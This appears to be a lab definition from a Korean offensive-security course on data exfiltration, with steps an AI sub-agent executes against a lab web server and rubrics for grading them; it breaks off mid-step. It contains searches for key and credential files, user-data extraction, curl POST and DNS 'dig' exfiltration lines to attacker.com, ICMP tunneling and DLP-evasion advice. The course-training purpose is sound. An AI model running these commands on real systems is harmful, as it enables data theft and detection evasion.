lab_id: attack-ai-week11
title: 데이터 유출 (Data Exfiltration) (AI 지원)
version: ai
course: attack-ai
week: 11
description: 침해된 시스템에서 민감한 데이터를 외부로 유출하는 다양한 기법을 실습한다. HTTP, DNS, ICMP 터널링, 스테가노그래피
  등 탐지를 회피하는 유출 기법과 방어 방법을 학습한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
difficulty: medium
duration_minutes: 120
objectives:
- 데이터 유출의 다양한 채널(HTTP, DNS, ICMP)을 이해한다
- 인코딩과 암호화를 통한 은밀한 데이터 전송을 수행할 수 있다
- DLP(Data Loss Prevention) 관점에서 유출 탐지 방법을 학습한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: web 서버에서 민감한 데이터가 포함된 파일을 식별하라. /etc, /home, /var/www에서 설정 파일과 데이터
    파일을 검색하라.
  hint: find 명령으로 .conf, .env, .key, .pem 등의 파일을 검색한다
  category: recon
  points: 10
  answer: '🤖 프롬프트: web 서버에서 민감한 데이터가 포함된 파일을 식별하라. /etc, /home, /var/www에서 설정 파일과
    데이터 파일을 검색해줘

    📎 참고 (CLI): ssh ccc@10.20.30.80 ''find /etc /home /var/www -type f \( -name "*.conf"
    -o -name "*.env" -o -name "*.key" -o -name "*.pem" -o -name "*.sql" \) 2>/dev/null
    | head -20'' 2>/dev/null'
  answer_detail: 데이터 유출의 첫 단계는 가치 있는 데이터를 식별하는 것이다. 설정 파일(자격 증명), 키 파일(인증서), 데이터 덤프(SQL)
    등이 주요 대상이다. MITRE ATT&CK의 Collection 전술에 해당한다.
  verify:
    type: output_contains
    expect: /
    field: stdout
    semantic:
      intent: 민감 파일 식별(T1005 Collection) — find /etc /home /var/www -type f -name
        .conf/.env/.key/.pem/.sql 로 고가치 파일 열거
      success_criteria:
      - ssh + find /etc /home /var/www \( -name .conf -o .env -o .key -o .pem -o .sql
        \) 실행
      - 출력에 실제 파일 경로 최소 2개
      - Collection 전술 MITRE ATT&CK T1005 언급
      acceptable_methods:
      - find + -name + 복합 조건
      - grep -rE (password|api_key) /etc
      - LinPEAS sensitive files 섹션
      - ripgrep rg pattern
      negative_signs:
      - 단일 확장자만 검색
      - 결과에서 고가치 파일 식별 없음
      - T1005 언급 없음
  target_vm: attacker
  script: ssh ccc@10.20.30.80 'find /etc /home /var/www -type f \( -name "*.conf"
    -o -name "*.env" -o -name "*.key" -o -name "*.pem" -o -name "*.sql" \) 2>/dev/null
    | head -20' 2>/dev/null
  risk_level: low
  bastion_prompt: 'web 서버에서 민감한 데이터가 포함된 파일을 식별하라. /etc, /home, /var/www에서 설정 파일과
    데이터 파일을 검색해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 2
  instruction: JuiceShop에서 SQL Injection을 통해 사용자 데이터를 추출하고, 결과를 파일로 저장하라.
  hint: 이전 week에서 배운 SQLi 기법으로 사용자 정보를 추출한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: JuiceShop에서 SQL Injection을 통해 사용자 데이터를 추출하고, 결과를 파일로 저장해줘

    📎 참고 (CLI): curl -s http://10.20.30.80:3000/api/Users | python3 -c "import sys,json;
    users=json.load(sys.stdin)[''data'']; [print(f\"{u[''id'']},{u[''email'']}\")
    for u in users]" > /tmp/exfil_users.csv && echo ''Extracted users:'' && wc -l
    /tmp/exfil_users.csv && head -5 /tmp/exfil_users.csv'
  answer_detail: 데이터 추출 후 CSV나 JSON 형식으로 저장하면 후속 처리가 용이하다. 실전에서는 대량 데이터를 청크로 나누어 점진적으로
    유출하여 탐지를 회피한다.
  verify:
    type: output_contains
    expect:
    - Extracted users
    - csv
    field: stdout
    semantic:
      intent: JuiceShop /api/Users SQLi 로 사용자 데이터 추출 후 CSV 파일(/tmp/exfil_users.csv)
        저장 — 청크 유출 준비
      success_criteria:
      - curl + python3 으로 id,email 컬럼만 추출
      - /tmp/exfil_users.csv 파일 저장 + wc -l 로 라인 수
      - 'Extracted users: 라벨 + head 출력'
      acceptable_methods:
      - curl | python3 json parse | redirect > file
      - curl | jq -r .data[] | \(.id),\(.email)
      - sqlmap --dump-all 로 대량 추출
      - python requests + pandas to_csv
      negative_signs:
      - 파일 저장 없음
      - 전체 JSON 저장 (필터 없음)
      - 라인 수 확인 없음
  target_vm: attacker
  script: curl -s http://10.20.30.80:3000/api/Users | python3 -c "import sys,json;
    users=json.load(sys.stdin)['data']; [print(f\"{u['id']},{u['email']}\") for u
    in users]" > /tmp/exfil_users.csv && echo 'Extracted users:' && wc -l /tmp/exfil_users.csv
    && head -5 /tmp/exfil_users.csv
  risk_level: medium
  bastion_prompt: 'JuiceShop에서 SQL Injection을 통해 사용자 데이터를 추출하고, 결과를 파일로 저장해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 3
  instruction: 추출한 데이터를 Base64로 인코딩하여 전송 준비를 하라.
  hint: base64 명령으로 파일을 인코딩한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: 추출한 데이터를 Base64로 인코딩하여 전송 준비를 해줘

    📎 참고 (CLI): base64 /tmp/exfil_users.csv > /tmp/exfil_encoded.txt && echo ''Original
    size:'' && wc -c /tmp/exfil_users.csv && echo ''Encoded size:'' && wc -c /tmp/exfil_encoded.txt
    && echo ''Preview:'' && head -3 /tmp/exfil_encoded.txt'
  answer_detail: Base64 인코딩은 바이너리 데이터를 텍스트로 변환하여 텍스트 기반 채널(HTTP, DNS)을 통해 전송할 수 있게
    한다. 크기가 약 33% 증가하지만, DLP 시스템의 패턴 매칭을 회피할 수 있다.
  verify:
    type: output_contains
    expect: Original size
    field: stdout
    semantic:
      intent: 추출 데이터 Base64 인코딩 — 바이너리→텍스트 변환으로 HTTP/DNS 텍스트 채널 호환, DLP 패턴 매칭 회피
      success_criteria:
      - base64 <file> > encoded.txt 실행
      - 원본 vs 인코딩 크기(+33%) 비교 출력
      - DLP 회피·텍스트 채널 호환 맥락 언급
      acceptable_methods:
      - base64 <file>
      - openssl base64 -in <file>
      - python3 base64.b64encode(open(f).read())
      - xxd -p (hex 대안)
      negative_signs:
      - 원본 크기만 측정
      - Preview 없음
      - DLP 회피 의도 언급 없음
  target_vm: attacker
  script: base64 /tmp/exfil_users.csv > /tmp/exfil_encoded.txt && echo 'Original size:'
    && wc -c /tmp/exfil_users.csv && echo 'Encoded size:' && wc -c /tmp/exfil_encoded.txt
    && echo 'Preview:' && head -3 /tmp/exfil_encoded.txt
  risk_level: medium
  bastion_prompt: '추출한 데이터를 Base64로 인코딩하여 전송 준비를 해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 4
  instruction: HTTP POST 요청을 통한 데이터 유출을 시뮬레이션하라. curl로 인코딩된 데이터를 외부 서버에 전송하는 방법을 시연하라.
  hint: curl -X POST -d @파일 형태로 데이터를 전송한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: HTTP POST 요청을 통한 데이터 유출을 시뮬레이션하라. curl로 인코딩된 데이터를 외부 서버에 전송하는 방법을
    시연해줘

    📎 참고 (CLI): echo ''=== HTTP Exfiltration Simulation ==='' && echo ''Method: curl
    -X POST -d @/tmp/exfil_encoded.txt http://attacker.com/collect'' && echo ''---''
    && echo ''With headers disguise:'' && echo ''curl -X POST -H "Content-Type: application/json"
    -d "{\"log\":\"$(head -1 /tmp/exfil_encoded.txt)\"}" http://attacker.com/api/logs''
    && echo ''---'' && echo ''HTTP exfil detected by: proxy logs, DLP, unusual POST
    sizes'''
  answer_detail: HTTP를 통한 데이터 유출은 정상 웹 트래픽과 구분하기 어렵다. JSON API 요청으로 위장하거나 정상적인 클라우드
    서비스(pastebin, cloud storage)를 경유하면 탐지가 더 어려워진다.
  verify:
    type: output_contains
    expect: HTTP Exfiltration
    field: stdout
    semantic:
      intent: HTTP POST 데이터 유출 시뮬 — curl -X POST -d @<encoded> + JSON 위장(Content-Type
        application/json, log 필드) 로 탐지 회피
      success_criteria:
      - curl -X POST -d @<file> http://attacker 명령 제시
      - JSON 위장 + Content-Type application/json 변형 추가
      - 탐지 방법(proxy logs·DLP·POST size) 언급
      acceptable_methods:
      - curl -X POST -d @<file>
      - curl -X POST -H Content-Type:application/json -d {...}
      - python requests.post
      - 실제 pastebin/cloud-storage 경유 예시
      negative_signs:
      - GET 으로 대체 (body 없음)
      - 정상 JSON 위장 없음
      - 탐지 방법 언급 없음
  target_vm: attacker
  script: 'echo ''=== HTTP Exfiltration Simulation ==='' && echo ''Method: curl -X
    POST -d @/tmp/exfil_encoded.txt http://attacker.com/collect'' && echo ''---''
    && echo ''With headers disguise:'' && echo ''curl -X POST -H "Content-Type: application/json"
    -d "{\"log\":\"$(head -1 /tmp/exfil_encoded.txt)\"}" http://attacker.com/api/logs''
    && echo ''---'' && echo ''HTTP exfil detected by: proxy logs, DLP, unusual POST
    sizes'''
  risk_level: medium
  bastion_prompt: 'HTTP POST 요청을 통한 데이터 유출을 시뮬레이션하라. curl로 인코딩된 데이터를 외부 서버에 전송하는 방법을
    시연해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 5
  instruction: DNS 터널링을 통한 데이터 유출의 원리를 이해하라. 데이터를 DNS 쿼리의 서브도메인으로 인코딩하는 방법을 시연하라.
  hint: 데이터를 hex/base32로 인코딩하여 DNS 쿼리에 포함한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: DNS 터널링을 통한 데이터 유출의 원리를 이해해줘

    📎 참고 (CLI): DATA=''sensitive_data''; ENCODED=$(echo -n $DATA | xxd -p); echo ''===
    DNS Tunneling Simulation ==='' && echo "Original: $DATA" && echo "Encoded: $ENCODED"
    && echo "DNS query: dig $ENCODED.exfil.attacker.com" && echo ''---'' && echo ''Real
    tools: iodine, dnscat2, DNSExfiltrator'' && echo ''Detection: unusually long DNS
    queries, high query volume to single domain'''
  answer_detail: 'DNS 터널링은 데이터를 DNS 쿼리의 서브도메인으로 인코딩하여 전송한다. DNS는 거의 모든 네트워크에서 허용되므로
    방화벽 우회에 효과적이다. 탐지: 비정상적으로 긴 도메인명, 단일 도메인에 대한 과다 쿼리.'
  verify:
    type: output_contains
    expect: DNS Tunneling
    field: stdout
    semantic:
      intent: DNS 터널링 원리 시연 — 데이터를 hex/base32 로 인코딩해 DNS 서브도메인(ENCODED.exfil.attacker.com)에
        실어 전송, iodine/dnscat2 언급
      success_criteria:
      - xxd -p 로 데이터 hex 인코딩 후 DNS 쿼리 형식 제시
      - dig <hex>.exfil.attacker.com 예시
      - 실제 도구(iodine/dnscat2/DNSExfiltrator) 최소 2개 + 탐지 방법(긴 도메인·높은 volume)
      acceptable_methods:
      - echo -n data | xxd -p + DNS 쿼리 구성
      - base32 인코딩 대안
      - iodine/dnscat2 설정 예시
      - python dnslib 으로 커스텀 터널
      negative_signs:
      - 인코딩 없이 raw 데이터
      - 실제 도구 언급 없음
      - 탐지 방법 누락
  target_vm: attacker
  script: 'DATA=''sensitive_data''; ENCODED=$(echo -n $DATA | xxd -p); echo ''===
    DNS Tunneling Simulation ==='' && echo "Original: $DATA" && echo "Encoded: $ENCODED"
    && echo "DNS query: dig $ENCODED.exfil.attacker.com" && echo ''---'' && echo ''Real
    tools: iodine, dnscat2, DNSExfiltrator'' && echo ''Detection: unusually long DNS
    queries, high query volume to single domain'''
  risk_level: medium
  bastion_prompt: 'DNS 터널링을 통한 데이터 유출의 원리를 이해해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 6
  instruction: ICMP 터널링의 원리를 이해하기 위해 ping 패킷에 커스텀 데이터를 포함하여 전송하라.
  hint: ping -p 옵션으로 패턴 데이터를 지정할 수 있다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: ICMP 터널링의 원리를 이해하기 위해 ping 패킷에 커스텀 데이터를 포함하여 전송해줘

    📎 참고 (CLI): echo ''=== ICMP Tunneling ==='' && echo ''Using ping -p to embed data
    in ICMP payload:'' && DATA_HEX=$(echo -n ''EXFIL'' | xxd -p) && echo "Data hex:
    $DATA_HEX" && ping -c 1 -p $DATA_HEX 10.20.30.80 2>&1 | head -5 && echo ''---''
    && echo ''Tools: icmpsh, ptunnel, icmptunnel'' && echo ''Detection: unusual ICMP
    packet sizes, high ICMP volume'''
  answer_detail: 'ICMP 터널링은 ping 패킷의 데이터 영역에 정보를 삽입하여 전송한다. 방화벽이 TCP/UDP를 차단해도 ICMP는
    허용하는 경우가 많다. 탐지: 비정상적인 ICMP 패킷 크기와 빈도를 모니터링한다.'
  verify:
    type: output_contains
    expect:
    - ICMP Tunneling
    - ping
    field: stdout
    semantic:
      intent: ICMP 터널링 — ping -p <hex> 로 Echo payload 에 커스텀 데이터 삽입, 방화벽의 TCP/UDP 차단
        시 ICMP 허용을 악용
      success_criteria:
      - echo -n <data> | xxd -p 로 hex 인코딩 후 ping -c 1 -p <hex>
      - Data hex 출력 + ICMP 패킷 전송 결과
      - icmpsh/ptunnel/icmptunnel 도구 언급 + 탐지(ICMP 크기·빈도)
      acceptable_methods:
      - ping -c 1 -p <hex> <IP>
      - hping3 --icmp --data <payload>
      - scapy IP/ICMP/Raw(load=...)
      - icmptunnel or ptunnel 직접 설정
      negative_signs:
      - ping 기본 실행 (-p 없이)
      - payload 인코딩 없음
      - 탐지 방법 누락
  target_vm: attacker
  script: 'echo ''=== ICMP Tunneling ==='' && echo ''Using ping -p to embed data in
    ICMP payload:'' && DATA_HEX=$(echo -n ''EXFIL'' | xxd -p) && echo "Data hex: $DATA_HEX"
    && ping -c 1 -p $DATA_HEX 10.20.30.80 2>&1 | head -5 && echo ''---'' && echo ''Tools:
    icmpsh, ptunnel, icmptunnel'' && echo ''Detection: unusual ICMP packet sizes,
    high ICMP volume'''
  risk_level: medium
  bastion_prompt: 'ICMP 터널링의 원리를 이해하기 위해 ping 패킷에 커스텀 데이터를 포함하여 전송해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 7
  instruction: 데이터를 암호화하여 유출하는 방법을 시연하라. openssl로 AES-256 암호화를 적용하라.
  hint: openssl enc -aes-256-cbc 옵션으로 파일을 암호화한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: 데이터를 암호화하여 유출하는 방법을 시연하라. openssl로 AES-256 암호화를 적용해줘

    📎 참고 (CLI): openssl enc -aes-256-cbc -salt -in /tmp/exfil_users.csv -out /tmp/exfil_encrypted.bin
    -pass pass:exfil_key_2026 -pbkdf2 2>/dev/null && echo ''Encrypted file:'' && file
    /tmp/exfil_encrypted.bin && ls -la /tmp/exfil_encrypted.bin && echo ''---'' &&
